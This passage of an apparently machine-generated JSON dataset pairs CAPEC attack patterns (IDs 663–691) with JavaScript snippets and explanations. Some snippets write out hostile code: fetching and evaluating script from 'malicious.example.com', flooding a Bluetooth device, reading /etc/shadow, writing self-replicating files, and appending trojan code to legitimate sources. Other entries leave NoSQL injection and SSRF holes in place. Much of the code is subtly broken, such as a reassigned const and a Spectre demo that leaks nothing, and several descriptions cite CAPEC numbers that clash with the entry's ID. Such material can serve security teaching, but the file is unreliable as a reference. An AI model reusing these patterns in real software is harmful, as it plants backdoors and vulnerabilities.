        "code_snippet": "const downloadAndExecute = (url) => {\n  fetch(url)\n    .then(response => response.text())\n    .then(code => {\n      eval(code); // CWE-494: Download of Code Without Integrity Check\n    })\n    .catch(error => console.error('Error:', error));\n};\n\nconst manipulateTraffic = () => {\n  const originalFetch = window.fetch;\n  window.fetch = function() {\n    // CWE-300: Channel Accessible by Non-Endpoint\n    console.log('Intercepted fetch call:', arguments);\n    return originalFetch.apply(this, arguments);\n  };\n};\n\n// CWE-602: Client-Side Enforcement of Server-Side Security\nif (userIsAuthenticated) {\n  manipulateTraffic();\n  downloadAndExecute('http://malicious.example.com/malicious.js');\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary exploits vulnerabilities in a web browser to manipulate traffic and execute malicious code. The `downloadAndExecute` function fetches and executes code from a remote location without verifying its integrity (CWE-494). The `manipulateTraffic` function intercepts and logs fetch calls, representing a channel accessible by a non-endpoint (CWE-300). The code also includes a conditional check for user authentication, which is a client-side enforcement of server-side security (CWE-602). This snippet embodies the main idea of the CAPEC by showing how an adversary can exploit these vulnerabilities to manipulate traffic and execute malicious actions."
    },
    {
        "capec_id": "663",
        "capec_name": "Exploitation of Transient Instruction Execution",
        "code_snippet": "function vulnerableFunction(secret) {\n  let publicData = 0;\n  let speculativeData = new Array(256).fill(0);\n  let index = Math.random() * 256; // Simulate branch prediction\n\n  if (index < 128) { // Speculative execution path\n    speculativeData[index] = secret.charCodeAt(0); // Transiently access secret data\n  }\n\n  // Covert channel: use cache timing to infer secret\n  let start = performance.now();\n  publicData = speculativeData[index];\n  let end = performance.now();\n\n  console.log('Timing difference:', end - start);\n}\n\nvulnerableFunction('S');",
        "description": "This JavaScript code snippet demonstrates a simplified version of a transient execution attack, such as Spectre. The function `vulnerableFunction` takes a secret as input and uses speculative execution to transiently access the secret data. The `index` variable simulates branch prediction, and the speculative execution path conditionally accesses the secret data. The covert channel is represented by measuring the timing difference when accessing the `speculativeData` array, which can be used to infer the secret. This code embodies the main idea of exploiting transient instruction execution to expose sensitive data, as described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "664",
        "capec_name": "Server Side Request Forgery",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const targetUrl = queryObject.target;\n\n  if (!targetUrl) {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Bad Request: target URL is missing');\n    return;\n  }\n\n  http.get(targetUrl, (response) => {\n    let data = '';\n    response.on('data', (chunk) => {\n      data += chunk;\n    });\n    response.on('end', () => {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(data);\n    });\n  }).on('error', (err) => {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end('Internal Server Error');\n  });\n}).listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. The server listens for incoming requests and expects a query parameter named 'target' that contains a URL. The server then makes an HTTP GET request to the specified URL and returns the response to the client. This code is vulnerable to Server-Side Request Forgery (SSRF) because it does not validate the 'target' URL, allowing an attacker to make the server send requests to internal services or external sites with the server's privileges. This demonstrates CWE-918 (SSRF) and CWE-20 (Improper Input Validation) as the server does not ensure the request is sent to an expected destination and does not validate the input properly."
    },
    {
        "capec_id": "665",
        "capec_name": "Exploitation of Thunderbolt Protection Flaws",
        "code_snippet": "const thunderboltController = require('thunderbolt-controller');\nconst spiDevice = require('spi-device');\n\n// CWE-1188: Initialization of a Resource with an Insecure Default\nlet authMechanism = 'default'; // Insecure default\n\n// CWE-345: Insufficient Verification of Data Authenticity\nfunction verifyData(data) {\n  // Insufficient verification\n  return data === 'trusted';\n}\n\n// CWE-353: Missing Support for Integrity Check\nfunction transmitData(data) {\n  // No integrity check\n  spiDevice.write(data);\n}\n\n// CWE-862: Missing Authorization\nfunction accessResource(resource) {\n  // No authorization check\n  return resource;\n}\n\n// CWE-288: Authentication Bypass Using an Alternate Path or Channel\nfunction authenticate(user) {\n  if (user === 'admin') {\n    return true;\n  }\n  // Bypass authentication\n  return true;\n}\n\n// Simulate exploitation of Thunderbolt protection flaws\nfunction exploitThunderbolt() {\n  let firmwareData = thunderboltController.readFirmware();\n  if (verifyData(firmwareData)) {\n    let resource = accessResource('sensitiveData');\n    transmitData(resource);\n  }\n}\n\nexploitThunderbolt();",
        "description": "This JavaScript code snippet simulates the exploitation of Thunderbolt protection flaws by leveraging several common weaknesses. The code initializes an insecure default authentication mechanism (CWE-1188), performs insufficient verification of data authenticity (CWE-345), transmits data without integrity checks (CWE-353), accesses resources without authorization checks (CWE-862), and bypasses authentication using an alternate path (CWE-288). The `exploitThunderbolt` function demonstrates how an adversary might manipulate the Thunderbolt controller firmware to access and transmit sensitive data without proper security checks, embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "666",
        "capec_name": "BlueSmacking",
        "code_snippet": "const bluetooth = require('bluetooth');\n\nfunction floodBluetooth(targetAddress) {\n  const largePacket = Buffer.alloc(1024 * 1024, 'A'); // 1MB packet filled with 'A'\n  const l2capChannel = bluetooth.createL2CAPChannel(targetAddress, 0x0040); // L2CAP PSM for RFCOMM\n\n  l2capChannel.on('connect', () => {\n    console.log('Connected to target. Starting flood...');\n    setInterval(() => {\n      l2capChannel.write(largePacket);\n    }, 10); // Flood every 10ms\n  });\n\n  l2capChannel.on('error', (err) => {\n    console.error('Error:', err);\n  });\n}\n\nconst targetBluetoothAddress = '00:11:22:33:44:55'; // Example target address\nfloodBluetooth(targetBluetoothAddress);",
        "description": "This JavaScript code snippet demonstrates a Bluetooth flooding attack, known as BlueSmacking, which aims to create a Denial of Service (DoS) on a target Bluetooth-enabled device. The code uses the 'bluetooth' module to create an L2CAP channel to the target device and sends large packets (1MB each) at regular intervals (every 10ms) to overwhelm the target's resources. This attack must be executed in close proximity to the target device. The code also highlights CWE-404 (Improper Resource Shutdown or Release) by not properly managing the resources used for the flood, potentially leading to resource exhaustion. Additionally, it indirectly touches on CWE-319 (Cleartext Transmission of Sensitive Information) and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel) by not securing the communication channel, making it susceptible to sniffing and tampering."
    },
    {
        "capec_id": "667",
        "capec_name": "Bluetooth Impersonation AttackS (BIAS)",
        "code_snippet": "const trustedMAC = '00:1A:7D:DA:71:13';\n\nfunction authenticateDevice(macAddress) {\n  if (macAddress === trustedMAC) {\n    console.log('Authentication successful');\n    // Perform actions as a trusted device\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\n// Adversary spoofs the MAC address\nconst adversaryMAC = '00:1A:7D:DA:71:13';\nauthenticateDevice(adversaryMAC);",
        "description": "This JavaScript code snippet demonstrates a simplified version of a Bluetooth Impersonation Attack (BIAS). The `authenticateDevice` function checks if the provided MAC address matches a trusted MAC address. If it does, it logs 'Authentication successful' and allows further actions. An adversary can spoof the MAC address to match the trusted one, bypassing the authentication check. This example highlights vulnerabilities such as Authentication Bypass by Spoofing (CWE-290) and Weak Authentication (CWE-1390), where the authentication mechanism does not sufficiently verify the identity of the device."
    },
    {
        "capec_id": "668",
        "capec_name": "Key Negotiation of Bluetooth Attack (KNOB)",
        "code_snippet": "const crypto = require('crypto');\n\nfunction negotiateKey() {\n  // Simulate key negotiation with low entropy\n  const entropyBits = 1; // Vulnerable: Low entropy bits\n  const key = crypto.randomBytes(entropyBits);\n  return key.toString('hex');\n}\n\nfunction authenticateConnection() {\n  const key = negotiateKey();\n  console.log('Negotiated Key:', key);\n  // Simulate improper authorization check\n  if (key === '0') { // Vulnerable: Weak check\n    console.log('Connection authenticated');\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\nauthenticateConnection();",
        "description": "This JavaScript code snippet demonstrates a vulnerable key negotiation process in a Bluetooth-like communication setup. The `negotiateKey` function simulates the negotiation of a cryptographic key with very low entropy (only 1 bit), making it easy for an attacker to guess the key. The `authenticateConnection` function then uses this weak key to authenticate a connection, with an improper authorization check that can be easily bypassed. This code embodies the main idea of the CAPEC by showing how an attacker can exploit low entropy in key negotiation to decrypt information. It also highlights related CWEs such as improper authorization (CWE-285) and protection mechanism failure (CWE-693)."
    },
    {
        "capec_id": "669",
        "capec_name": "Alteration of a Software Update",
        "code_snippet": "const fs = require('fs');\nconst crypto = require('crypto');\n\n// Simulate an update process\nfunction updateSoftware(updateFilePath) {\n  // CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n  if (!fs.existsSync(updateFilePath)) {\n    console.error('Update file not found');\n    return;\n  }\n\n  // CWE-807: Reliance on Untrusted Inputs in a Security Decision\n  const updateContent = fs.readFileSync(updateFilePath, 'utf8');\n  if (!verifyUpdate(updateContent)) {\n    console.error('Update verification failed');\n    return;\n  }\n\n  // CWE-506: Embedded Malicious Code\n  const maliciousCode = 'console.log(\"Malicious code executed\");';\n  const updatedContent = updateContent + '\\n' + maliciousCode;\n\n  // Apply the update (simulated)\n  applyUpdate(updatedContent);\n}\n\nfunction verifyUpdate(content) {\n  // Simulate a verification process (insecure)\n  return content.includes('trusted');\n}\n\nfunction applyUpdate(content) {\n  // Simulate applying the update\n  console.log('Applying update...');\n  eval(content); // CWE-506: Executing potentially malicious code\n}\n\n// Simulate an attacker altering the update file\nconst updateFilePath = 'path/to/update/file.js';\nupdateSoftware(updateFilePath);",
        "description": "This JavaScript code snippet simulates a software update process that embodies the main idea of CAPEC-117: Alteration of a Software Update. The code demonstrates several related CWEs: CWE-527 (exposure of version-control repository), CWE-807 (reliance on untrusted inputs), and CWE-506 (embedded malicious code). The `updateSoftware` function reads an update file, verifies it using an insecure method, and then appends malicious code to the update content before applying it. The `applyUpdate` function uses `eval` to execute the potentially malicious code, representing the risk of an adversary altering a software update to perform malicious acts."
    },
    {
        "capec_id": "670",
        "capec_name": "Software Development Tools Maliciously Altered",
        "code_snippet": "function authenticate(user, pass) {\n  // CWE-506: Embedded Malicious Code\n  if (user === 'admin' && pass === 'password') {\n    // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n    console.log('Sensitive Data: {\"token\": \"12345\"}');\n    return true;\n  }\n  return false;\n}\n\n// CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\nfunction secureFunction() {\n  let securityCheck = true;\n  if (securityCheck) {\n    // Security-critical code\n    console.log('Security check passed');\n  }\n}\n\n// CWE-913: Improper Control of Dynamically-Managed Code Resources\nlet dynamicCode = new Function('console.log(\"Executing dynamic code\")');\ndynamicCode();\n\n// CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\nfunction criticalFunction() {\n  let criticalCheck = true;\n  if (criticalCheck) {\n    // Critical security code\n    console.log('Critical check passed');\n  }\n}\n\n// Simulate malicious alteration of development tools\nauthenticate('admin', 'password');\nsecureFunction();\ncriticalFunction();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Software Development Tools Maliciously Altered' by embedding vulnerabilities related to the specified CWEs. The 'authenticate' function contains CWE-506 by logging sensitive information (CWE-497) when certain credentials are used. The 'secureFunction' and 'criticalFunction' illustrate CWE-733 and CWE-1037 by including security-critical code that could be optimized away by a compiler or processor. The dynamic code execution in 'dynamicCode' represents CWE-913. The code simulates the impact of maliciously altered development tools by embedding these vulnerabilities, which could be exploited once the software is deployed."
    },
    {
        "capec_id": "671",
        "capec_name": "Requirements for ASIC Functionality Maliciously Altered",
        "code_snippet": "class ASICSecurity {\n  constructor() {\n    this.securityTokens = {};\n    this.confidentialData = 'Sensitive Information';\n  }\n\n  generateSecurityToken(entity) {\n    // CWE-1270: Generation of Incorrect Security Tokens\n    this.securityTokens[entity] = Math.random().toString(36).substring(2);\n    return this.securityTokens[entity];\n  }\n\n  assignSecurityToken(entity, token) {\n    // CWE-1259: Improper Restriction of Security Token Assignment\n    if (this.securityTokens[entity] !== token) {\n      console.log('Security Token Assignment Error');\n    }\n  }\n\n  accessConfidentialData(entity, token) {\n    // CWE-1294: Insecure Security Identifier Mechanism\n    if (this.securityTokens[entity] === token) {\n      // CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n      return this.confidentialData;\n    } else {\n      console.log('Access Denied');\n    }\n  }\n\n  physicalAccessControl(entity) {\n    // CWE-1263: Improper Physical Access Control\n    if (entity === 'unauthorized') {\n      console.log('Unauthorized Physical Access');\n    } else {\n      console.log('Access Granted');\n    }\n  }\n}\n\n// Example usage\nconst asicSecurity = new ASICSecurity();\nconst token = asicSecurity.generateSecurityToken('user1');\nasicSecurity.assignSecurityToken('user1', token);\nconsole.log(asicSecurity.accessConfidentialData('user1', token));\nasicSecurity.physicalAccessControl('unauthorized');",
        "description": "This JavaScript code snippet represents a simplified model of an ASIC security system, highlighting vulnerabilities described in the CAPEC and related CWEs. The `ASICSecurity` class includes methods to generate and assign security tokens, access confidential data, and control physical access. The `generateSecurityToken` method demonstrates CWE-1270 by potentially generating incorrect tokens. The `assignSecurityToken` method shows CWE-1259 by not properly restricting token assignments. The `accessConfidentialData` method illustrates CWE-1294 and CWE-1297 by using insecure identifiers and allowing access to confidential data. Finally, the `physicalAccessControl` method represents CWE-1263 by not adequately protecting against unauthorized physical access. This code embodies the main idea of maliciously altered ASIC functionality requirements, leading to security vulnerabilities."
    },
    {
        "capec_id": "672",
        "capec_name": "Malicious Code Implanted During Chip Programming",
        "code_snippet": "function maliciousChipProgramming() {\n  // CWE-506: Embedded Malicious Code\n  var maliciousPayload = 'malicious_code';\n  \n  // CWE-509: Replicating Malicious Code (Virus or Worm)\n  function replicateMaliciousCode() {\n    // Code to replicate the malicious payload\n    console.log('Replicating malicious payload...');\n  }\n  \n  // CWE-1423: Exposure of Sensitive Information\n  function exposeSensitiveInfo() {\n    // Code to exploit shared microarchitectural predictor state\n    console.log('Exposing sensitive information...');\n  }\n  \n  // CWE-1262: Improper Access Control for Register Interface\n  function accessHardwareRegisters() {\n    // Code to improperly access hardware registers\n    console.log('Accessing hardware registers...');\n  }\n  \n  // CWE-1259: Improper Restriction of Security Token Assignment\n  function manipulateSecurityTokens() {\n    // Code to improperly manipulate security tokens\n    console.log('Manipulating security tokens...');\n  }\n  \n  // Execute malicious actions\n  replicateMaliciousCode();\n  exposeSensitiveInfo();\n  accessHardwareRegisters();\n  manipulateSecurityTokens();\n}\n\n// Simulate the malicious chip programming\nmaliciousChipProgramming();",
        "description": "This JavaScript code snippet simulates the concept of 'Malicious Code Implanted During Chip Programming' (CAPEC). The function `maliciousChipProgramming` contains embedded malicious code (CWE-506) that replicates itself (CWE-509), exposes sensitive information by exploiting shared microarchitectural predictor state (CWE-1423), improperly accesses hardware registers (CWE-1262), and manipulates security tokens (CWE-1259). The code demonstrates how an adversary could embed and execute malicious logic during the chip programming phase, leading to various malicious activities when the chip is in operational use."
    },
    {
        "capec_id": "673",
        "capec_name": "Developer Signing Maliciously Altered Software",
        "code_snippet": "const fs = require('fs');\nconst https = require('https');\n\n// CWE-494: Download of Code Without Integrity Check\nhttps.get('https://example.com/malicious-code.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // CWE-506: Embedded Malicious Code\n    const maliciousCode = data + '\\nconsole.log(\"Malicious code executed\");';\n    \n    // CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n    fs.writeFileSync('./repo/malicious-code.js', maliciousCode);\n    \n    // CWE-215: Insertion of Sensitive Information Into Debugging Code\n    const debugInfo = 'DEBUG: Sensitive Info: ' + process.env.SENSITIVE_INFO;\n    fs.appendFileSync('./repo/malicious-code.js', '\\n' + debugInfo);\n    \n    // CWE-507: Trojan Horse\n    const originalCode = fs.readFileSync('./repo/legit-code.js', 'utf8');\n    const trojanHorse = originalCode + '\\n' + maliciousCode;\n    fs.writeFileSync('./repo/legit-code.js', trojanHorse);\n    \n    // Simulate signing the code\n    console.log('Code signed by developer');\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a scenario where a developer inadvertently signs maliciously altered software. The code downloads a script from a remote location without verifying its integrity (CWE-494). It then embeds malicious code into the downloaded script (CWE-506) and stores it in a version-control repository that could be exposed to unauthorized access (CWE-527). Additionally, it inserts sensitive information into the debugging code (CWE-215) and combines the malicious code with legitimate code to create a Trojan Horse (CWE-507). Finally, it simulates the signing of the altered code by the developer, representing the main idea of the CAPEC."
    },
    {
        "capec_id": "674",
        "capec_name": "Design for FPGA Maliciously Altered",
        "code_snippet": "function configureFPGA(config) {\n  // Original FPGA configuration\n  let originalConfig = config;\n  \n  // Malicious alteration: Injecting malicious function\n  function maliciousFunction() {\n    console.log('Malicious function executed');\n    // Perform malicious operations\n  }\n  \n  // Simulate unauthorized error injection\n  if (Math.random() < 0.1) { // 10% chance to inject error\n    originalConfig = null;\n    console.error('Error injected, configuration corrupted');\n  }\n  \n  // Simulate improper protection against voltage and clock glitches\n  if (Math.random() < 0.1) { // 10% chance to glitch\n    console.warn('Voltage/Clock glitch detected');\n    // Potentially bypass security checks\n  }\n  \n  // Apply the (potentially altered) configuration\n  if (originalConfig) {\n    console.log('FPGA configured successfully');\n  } else {\n    console.error('FPGA configuration failed');\n  }\n  \n  // Execute the malicious function if configuration is altered\n  if (!originalConfig) {\n    maliciousFunction();\n  }\n}\n\n// Example usage\nconfigureFPGA({ setting1: 'value1', setting2: 'value2' });",
        "description": "This JavaScript code snippet simulates the process of configuring an FPGA, with the potential for malicious alterations as described in the CAPEC. The `configureFPGA` function takes a configuration object as input. It then defines a `maliciousFunction` that represents the malicious code injected into the FPGA. The code simulates two vulnerabilities: unauthorized error injection and improper protection against voltage and clock glitches, each with a 10% chance of occurrence. If an error is injected, the original configuration is nullified, and the malicious function is executed. This snippet embodies the idea of altering FPGA functionality to introduce malicious behavior, leveraging related weaknesses such as error injection and insufficient glitch protection."
    },
    {
        "capec_id": "675",
        "capec_name": "Retrieve Data from Decommissioned Devices",
        "code_snippet": "const sensitiveData = 'user_password';\n\n// Simulate storing sensitive data in memory\nlet memoryStorage = sensitiveData;\n\n// Simulate decommissioning the device without proper scrubbing\nfunction decommissionDevice() {\n  // Improper scrubbing: sensitive data is not removed\n  memoryStorage = null; // This does not actually remove the data from memory\n}\n\ndecommissionDevice();\n\n// Simulate an adversary retrieving data from decommissioned device\nfunction retrieveDataFromDecommissionedDevice() {\n  if (memoryStorage === null) {\n    console.log('Sensitive data might still be retrievable from memory.');\n  }\n}\n\nretrieveDataFromDecommissionedDevice();",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive data is stored in memory and the device is decommissioned without properly scrubbing the data. The `decommissionDevice` function sets the memory storage to null, which does not actually remove the sensitive data from memory. An adversary can potentially retrieve the sensitive data even after the device is decommissioned. This code embodies the main idea of CAPEC-199: 'Retrieve Data from Decommissioned Devices' and highlights related CWEs such as 'Improper Scrubbing of Sensitive Data from Decommissioned Device' (CWE-1266) and 'Cleartext Storage of Sensitive Information in Memory' (CWE-316)."
    },
    {
        "capec_id": "676",
        "capec_name": "NoSQL Injection",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst MongoClient = require('mongodb').MongoClient;\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst url = 'mongodb://localhost:27017';\nconst dbName = 'mydatabase';\n\nMongoClient.connect(url, { useNewUrlParser: true, useUnifiedTopology: true }, (err, client) => {\n  if (err) throw err;\n  const db = client.db(dbName);\n\n  app.post('/login', (req, res) => {\n    const username = req.body.username;\n    const password = req.body.password;\n\n    // Vulnerable to NoSQL Injection\n    db.collection('users').findOne({ username: username, password: password }, (err, user) => {\n      if (err) throw err;\n      if (user) {\n        res.send('Login successful');\n      } else {\n        res.send('Login failed');\n      }\n    });\n  });\n\n  app.listen(3000, () => {\n    console.log('Server is running on port 3000');\n  });\n});",
        "description": "This JavaScript code snippet sets up an Express.js server with a MongoDB connection. It includes a '/login' endpoint that takes 'username' and 'password' from the request body and queries the MongoDB 'users' collection to find a matching user. The query is constructed directly from user input without proper validation or neutralization, making it vulnerable to NoSQL Injection attacks. An attacker could manipulate the input to bypass authentication or execute arbitrary commands, demonstrating the main idea of CAPEC-943 and related CWEs such as improper neutralization of special elements and improper validation of input."
    },
    {
        "capec_id": "677",
        "capec_name": "Server Motherboard Compromise",
        "code_snippet": "const fs = require('fs');\n\n// CWE-506: Embedded Malicious Code\nfunction maliciousFirmwareUpdate() {\n    // CWE-497: Exposure of Sensitive System Information\n    const sensitiveData = fs.readFileSync('/etc/shadow', 'utf8');\n    console.log('Sensitive Data:', sensitiveData);\n\n    // CWE-1262: Improper Access Control for Register Interface\n    const hardwareRegister = 0xDEADBEEF;\n    hardwareRegister = 0xBADCAFE; // Unauthorized modification\n\n    // CWE-1323: Improper Management of Sensitive Trace Data\n    const traceData = 'Sensitive Trace Data';\n    fs.writeFileSync('/unprotected/trace.log', traceData);\n\n    // CWE-509: Replicating Malicious Code (Virus or Worm)\n    const maliciousCode = `\n        const fs = require('fs');\n        fs.writeFileSync('/tmp/malicious.js', 'console.log(\"Malicious Code Executed\");');\n        require('/tmp/malicious.js');\n    `;\n    fs.writeFileSync('/tmp/replicate.js', maliciousCode);\n    require('/tmp/replicate.js');\n}\n\nmaliciousFirmwareUpdate();",
        "description": "This JavaScript code snippet simulates a malicious firmware update process, embodying the main idea of the CAPEC 'Server Motherboard Compromise'. The code includes several CWE-related vulnerabilities: CWE-506 (Embedded Malicious Code) by defining a function that performs malicious actions, CWE-497 (Exposure of Sensitive System Information) by reading and logging sensitive data, CWE-1262 (Improper Access Control for Register Interface) by unauthorized modification of a hardware register, CWE-1323 (Improper Management of Sensitive Trace Data) by storing trace data in an unprotected location, and CWE-509 (Replicating Malicious Code) by creating and executing a replicating malicious script. This snippet represents how malware can be inserted into server firmware to alter its functionality and compromise the system."
    },
    {
        "capec_id": "678",
        "capec_name": "System Build Data Maliciously Altered",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-426: Untrusted Search Path\nconst configPath = process.env.CONFIG_PATH || './config.json';\n\n// CWE-497: Exposure of Sensitive System Information\nconst sensitiveData = fs.readFileSync(configPath, 'utf8');\nconsole.log(`Loaded configuration from: ${configPath}`);\n\n// CWE-377: Insecure Temporary File\nconst tempFilePath = path.join('/tmp', 'tempfile.txt');\nfs.writeFileSync(tempFilePath, sensitiveData);\nconsole.log(`Temporary file created at: ${tempFilePath}`);\n\n// CWE-209: Generation of Error Message Containing Sensitive Information\ntry {\n  const config = JSON.parse(sensitiveData);\n  console.log('Configuration loaded successfully');\n} catch (error) {\n  console.error(`Error parsing configuration: ${error.message}`);\n}\n\n// CWE-913: Improper Control of Dynamically-Managed Code Resources\nconst dynamicCode = new Function('return ' + sensitiveData);\nconsole.log(dynamicCode());",
        "description": "This JavaScript code snippet demonstrates a scenario where system build data can be maliciously altered, leading to various vulnerabilities. The code reads a configuration file from an untrusted search path (CWE-426), exposing sensitive system information (CWE-497). It then writes this sensitive data to an insecure temporary file (CWE-377). If an error occurs while parsing the configuration, it generates an error message that may contain sensitive information (CWE-209). Finally, it improperly handles dynamically-managed code resources by executing code derived from the sensitive data (CWE-913). This snippet embodies the main idea of CAPEC-230, where the system build process is deliberately misconfigured, leading to multiple security weaknesses."
    },
    {
        "capec_id": "679",
        "capec_name": "Exploitation of Improperly Configured or Implemented Memory Protections",
        "code_snippet": "const buffer = new ArrayBuffer(16);\nconst view = new DataView(buffer);\n\n// Simulate improper access control by writing to a protected memory region\nview.setUint32(0, 0xdeadbeef, true);\n\n// Simulate execution of data from writable memory\nconst executeData = new Function('return ' + view.getUint32(0, true));\nconsole.log(executeData());",
        "description": "This JavaScript code snippet demonstrates the exploitation of improperly configured or implemented memory protections. It creates an ArrayBuffer and a DataView to simulate a memory region. The code then writes a value (0xdeadbeef) to this memory region, representing a lack of proper access control (CWE-1257, CWE-1260). Following this, it constructs a function from the data in the writable memory and executes it, illustrating the lack of exclusivity between write and execute operations (CWE-1252). This snippet embodies the main idea of CAPEC by showing how an attacker can manipulate and execute data in memory due to improper memory protections."
    },
    {
        "capec_id": "680",
        "capec_name": "Exploitation of Improperly Controlled Registers",
        "code_snippet": "class Register { \n  constructor() { \n    this.lockBit = false; \n    this.data = 0; \n  } \n\n  writeData(value) { \n    if (!this.lockBit) { \n      this.data = value; \n    } else { \n      console.log('Register is locked. Cannot write data.'); \n    } \n  } \n\n  lockRegister() { \n    this.lockBit = true; \n  } \n\n  unlockRegister() { \n    this.lockBit = false; \n  } \n\n  readData() { \n    return this.data; \n  } \n} \n\n// Example usage \nlet reg = new Register(); \nreg.writeData(42); \nconsole.log(reg.readData()); // Outputs: 42 \nreg.lockRegister(); \nreg.writeData(100); // Should not change the data \nconsole.log(reg.readData()); // Outputs: 42 \nreg.unlockRegister(); \nreg.writeData(100); \nconsole.log(reg.readData()); // Outputs: 100",
        "description": "This JavaScript code snippet defines a Register class that simulates a hardware register with a lock bit mechanism. The lock bit is intended to prevent unauthorized modifications to the register's data. However, the class includes an 'unlockRegister' method, which allows the lock bit to be reset, thereby enabling further modifications. This represents the vulnerability described in the CAPEC and related CWEs, where improper access control and lock bit protection can be exploited by an adversary to modify register data that should be protected."
    },
    {
        "capec_id": "681",
        "capec_name": "Exploitation of Improperly Controlled Hardware Security Identifiers",
        "code_snippet": "class SoC {\n  constructor() {\n    this.securityTokens = {};\n  }\n\n  assignToken(entity, token) {\n    // CWE-1259: Improper Restriction of Security Token Assignment\n    this.securityTokens[entity] = token; // No validation or protection of tokens\n  }\n\n  performAction(entity, action) {\n    // CWE-1270: Generation of Incorrect Security Tokens\n    const token = this.securityTokens[entity];\n    if (!token) {\n      console.log('Action denied: No security token found.');\n      return;\n    }\n\n    // CWE-1294: Insecure Security Identifier Mechanism\n    if (token !== 'valid-token') { // Simplistic and insecure token check\n      console.log('Action denied: Invalid security token.');\n      return;\n    }\n\n    // CWE-1302: Missing Source Identifier in Entity Transactions\n    if (!entity) { // No source identifier check\n      console.log('Action denied: Missing entity identifier.');\n      return;\n    }\n\n    console.log(`Action ${action} performed by ${entity}.`);\n  }\n}\n\nconst soc = new SoC();\nsoc.assignToken('entity1', 'invalid-token'); // Assigning an incorrect token\nsoc.performAction('entity1', 'read'); // Attempting to perform an action with an invalid token\n",
        "description": "This JavaScript code snippet represents a simplified System-on-Chip (SoC) security mechanism that is vulnerable to exploitation due to improper handling of security identifiers. The `SoC` class has methods to assign security tokens to entities and to perform actions based on these tokens. The code demonstrates several weaknesses: improper restriction and validation of security tokens (CWE-1259), generation of incorrect security tokens (CWE-1270), insecure security identifier mechanism (CWE-1294), and missing source identifier in transactions (CWE-1302). These vulnerabilities can be exploited by an adversary to perform unauthorized actions."
    },
    {
        "capec_id": "682",
        "capec_name": "Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities",
        "code_snippet": "class Device {\n  constructor() {\n    this.firmwareVersion = '1.0.0';\n    this.isFirmwareUpdateable = false; // CWE-1277: Firmware Not Updateable\n  }\n\n  updateFirmware(newVersion) {\n    if (this.isFirmwareUpdateable) {\n      this.firmwareVersion = newVersion;\n      console.log('Firmware updated to version ' + newVersion);\n    } else {\n      console.log('Firmware update failed: Device firmware is not updateable.');\n    }\n  }\n\n  checkROMPatch() {\n    // CWE-1310: Missing Ability to Patch ROM Code\n    console.log('ROM patching not supported. Device may be vulnerable.');\n  }\n\n  useNonUpdateableComponent() {\n    // CWE-1329: Reliance on Component That is Not Updateable\n    console.log('Using a non-updateable component. Potential vulnerabilities cannot be patched.');\n  }\n\n  handleVoltageGlitch() {\n    // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n    console.log('Warning: Voltage and clock glitch protection not implemented. Device may be vulnerable.');\n  }\n\n  injectError() {\n    // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n    console.log('Error injected. Hardware redundancy may be degraded.');\n  }\n}\n\nconst myDevice = new Device();\nmyDevice.updateFirmware('1.1.0');\nmyDevice.checkROMPatch();\nmyDevice.useNonUpdateableComponent();\nmyDevice.handleVoltageGlitch();\nmyDevice.injectError();",
        "description": "This JavaScript code defines a `Device` class that embodies the main idea of CAPEC-Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities. The class includes methods that demonstrate various related CWEs: inability to update firmware (CWE-1277), missing ability to patch ROM code (CWE-1310), reliance on non-updateable components (CWE-1329), lack of protection against voltage and clock glitches (CWE-1247), and vulnerability to unauthorized error injection (CWE-1334). The code simulates a device that cannot be updated or patched, highlighting the potential security risks associated with such design flaws."
    },
    {
        "capec_id": "690",
        "capec_name": "Metadata Spoofing",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\n// Function to download a file without integrity check\nfunction downloadFile(url, dest) {\n  const file = fs.createWriteStream(dest);\n  http.get(url, (response) => {\n    response.pipe(file);\n    file.on('finish', () => {\n      file.close();\n      console.log('Download completed');\n    });\n  }).on('error', (err) => {\n    fs.unlink(dest);\n    console.error('Download failed:', err.message);\n  });\n}\n\n// Function to read metadata from a file\nfunction readMetadata(filePath) {\n  fs.stat(filePath, (err, stats) => {\n    if (err) {\n      console.error('Error reading metadata:', err.message);\n      return;\n    }\n    console.log('File metadata:', stats);\n  });\n}\n\n// Example usage\nconst url = 'http://example.com/malicious-file.js';\nconst dest = 'downloaded-file.js';\ndownloadFile(url, dest);\nreadMetadata(dest);",
        "description": "This JavaScript code snippet demonstrates a scenario where a file is downloaded from a remote location without performing an integrity check (CWE-494). The 'downloadFile' function downloads a file from a given URL and saves it to a specified destination. The 'readMetadata' function reads and logs the metadata of the downloaded file. This setup can be exploited by an adversary to alter the metadata of the downloaded file (CAPEC-139: Metadata Spoofing), making a malicious file appear legitimate. The code also touches on CWE-348 (Use of Less Trusted Source) by downloading a file from an untrusted URL, and CWE-1230 (Exposure of Sensitive Information Through Metadata) by potentially exposing sensitive metadata information."
    },
    {
        "capec_id": "691",
